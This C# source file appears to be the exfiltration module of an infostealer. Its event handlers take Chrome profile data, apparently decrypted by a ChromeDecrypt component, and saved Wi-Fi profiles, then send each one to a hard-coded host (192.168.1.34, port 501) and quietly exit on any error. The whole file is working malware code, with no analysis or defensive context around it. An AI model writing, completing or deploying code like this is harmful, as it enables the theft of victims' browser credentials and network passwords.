using System;
using System.Collections.Generic;
using ChromeDecrypt;
using PS03.Transmit;
using WiPS.Modles;

namespace PS03
{
    public class Eventhandlers
    {
        public RTransLink rtl = new RTransLink("192.168.1.34",501);
        private ChromePacker cpack = new ChromePacker();
        private WifiPacker wpack = new WifiPacker();

        public void HandleWiFiProfileReady(List<Profile> profiles)
        {
            foreach (var profile in profiles)
            {
                try
                {
                    rtl.Send(wpack.Pack(profile));
                }
                catch(Exception)
                {
                    Environment.Exit(0);
                }
            }
                
        }

        public void HandleChromeDataReady(List<CPProfile> profiles)
        {
            foreach (var profile in profiles)
            {
                try
                {
                    rtl.Send(cpack.Pack(profile));
                }
                catch (Exception)
                {
                    Environment.Exit(0);
                }
            }

        }
    }
}